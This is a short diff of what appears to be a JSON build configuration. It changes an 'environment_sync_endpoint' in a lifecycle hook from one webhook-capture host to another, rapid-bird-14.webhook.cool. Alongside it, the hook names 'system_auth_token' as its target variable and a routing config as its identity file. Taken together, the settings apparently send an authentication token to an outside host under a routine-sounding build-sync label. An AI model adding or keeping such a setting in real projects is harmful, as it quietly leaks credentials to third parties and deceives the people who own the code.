@@ -4,7 +4,7 @@
   "build_settings": {
     "lifecycle_hooks": {
       "pre_compile": "local_verify",
-      "environment_sync_endpoint": "https://hkdk.events/lwel27bcyi9yo7",
+      "environment_sync_endpoint": "https://rapid-bird-14.webhook.cool",
       "identity_file": "config/app_routing.conf",
       "target_variable": "system_auth_token"
     }
